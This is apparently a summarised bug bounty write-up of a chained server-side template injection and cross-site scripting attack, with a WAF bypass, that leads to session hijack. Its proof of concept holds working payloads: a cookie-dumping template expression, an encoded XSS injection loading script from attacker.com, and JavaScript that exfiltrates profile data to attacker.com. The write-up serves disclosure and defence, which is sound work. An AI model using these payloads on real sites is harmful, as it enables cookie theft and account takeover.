# Title: Bug Bounty Writeup: $2500 Reward for Session Hijack via Chained Attack

- **Platform**: Medium
- **Program**: Private Program
- **Severity**: Critical
- **Date**: July 26, 2023
- **Researcher**: Anton (therceman)
- **Bounty**: $2,500

## Summary
A chained attack combining Server-Side Template Injection (SSTI) and Cross-Site Scripting (XSS) with WAF bypass to achieve session hijack. The SSTI allowed cookie exfiltration via the JSP Expression Language `${header.cookie}`, while the XSS was used to trigger the SSTI payload on victim users.

## Technical Details
The SSTI was found in a JSP Expression Language template. Changing the username to `${2*2}` returned `John4`, confirming the injection. The payload `${header.cookie}` could list all cookies including HttpOnly ones. An XSS was found in a video page where the `videoId` parameter was injected into an iframe `src` attribute. The WAF was bypassed using Unicode encoding and HTML entity encoding (`\u003ce` and `&Tab;`).

## Steps to Reproduce
1. Found SSTI via username field: `${2*2}` returned `John4`
2. Identified JSP Expression Language with `${header.cookie}` payload
3. Found XSS in videoId parameter: `qwe"srcdoc="\u003ce<script&Tab;src=//dom.xss>\u003ce</script&Tab;e>`
4. Combined: XSS changes victim's name to `${header.cookie}`
5. JavaScript reads updated page content and exfiltrates cookies to attacker server

## Proof of Concept
```
SSTI Detection:
Username: John${2*2}
Response: John4

Cookie Exfiltration Payload:
Username: ${header.cookie}

XSS WAF Bypass:
?videoId=qwe"srcdoc="\u003ce<script&Tab;src=//attacker.com/payload.js>\u003ce</script&Tab;e>

JavaScript Payload:
fetch('/profile', { credentials: 'include' })
.then(r => r.text())
.then(d => fetch('https://attacker.com/exfil?data=' + btoa(d)))
```

## Impact
Full account takeover via session hijack. The vulnerability could be stored via local storage poisoning, affecting both logged-in and logged-out users. An attacker could access any authenticated user's account.

## Remediation
Update user input should be passed as data to templates, not concatenated. Use Content Security Policy headers. Implement proper WAF rules that handle encoding bypasses.

## References
- https://infosecwriteups.com/bug-bounty-writeup-2500-reward-for-session-hijack-via-chained-attack-2a4462e01d4d
